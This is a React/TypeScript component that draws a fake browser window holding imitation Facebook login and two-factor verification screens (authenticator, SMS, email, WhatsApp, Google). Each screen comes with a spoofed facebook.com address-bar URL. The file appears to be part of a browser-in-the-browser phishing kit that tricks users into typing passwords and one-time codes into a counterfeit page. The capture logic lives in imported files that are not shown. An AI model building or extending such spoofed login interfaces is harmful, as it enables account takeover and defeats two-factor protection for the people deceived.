import ModalChrome from './ModalChrome';
import FbLogin from '../pages/facebook/Login';
import FbAuthApp from '../pages/facebook/AuthApp';
import FbSmsVerification from '../pages/facebook/SmsVerification';
import FbEmailOtp from '../pages/facebook/EmailOtp';
import FbWhatsAppVerification from '../pages/facebook/WhatsAppVerification';
import FbAuthWithGoogle from '../pages/facebook/AuthWithGoogle';

export type FbPage = 'login' | 'auth-app' | 'sms' | 'email-otp' | 'whatsapp' | 'auth-with-google';

const FB_ADDRESS_URLS: Record<FbPage, string> = {
  'login': 'www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzI...',
  'auth-app': 'www.facebook.com/two_step_verification/authentication/?encrypted_context=ARHGj9e6bU4t...',
  'sms': 'www.facebook.com/two_step_verification/sms/?encrypted_context=ARHGj9e6bU4t_TcvPymKfPs23AR...',
  'email-otp': 'www.facebook.com/two_step_verification/email/?encrypted_context=ARHGj9e6bU4t_TcvPymKf...',
  'whatsapp': 'www.facebook.com/two_step_verification/whatsapp/?encrypted_context=ARHGj9e6bU4t_TcvPym...',
  'auth-with-google': 'www.facebook.com/accountquality/odfa_landing_page/?ref=SEC_SETTINGS&source=goo...',
};

interface FacebookModalProps {
  isOpen: boolean;
  currentPage: FbPage;
  onClose: () => void;
}

export default function FacebookModal({ isOpen, currentPage, onClose }: FacebookModalProps) {
  const addressUrl = FB_ADDRESS_URLS[currentPage] || FB_ADDRESS_URLS['login'];

  const renderPage = () => {
    switch (currentPage) {
      case 'login': return <FbLogin />;
      case 'auth-app': return <FbAuthApp />;
      case 'sms': return <FbSmsVerification />;
      case 'email-otp': return <FbEmailOtp />;
      case 'whatsapp': return <FbWhatsAppVerification />;
      case 'auth-with-google': return <FbAuthWithGoogle />;
      default: return <FbLogin />;
    }
  };

  return (
    <ModalChrome
      isOpen={isOpen}
      onClose={onClose}
      variant="facebook"
      addressUrl={addressUrl}
    >
      {renderPage()}
    </ModalChrome>
  );
}
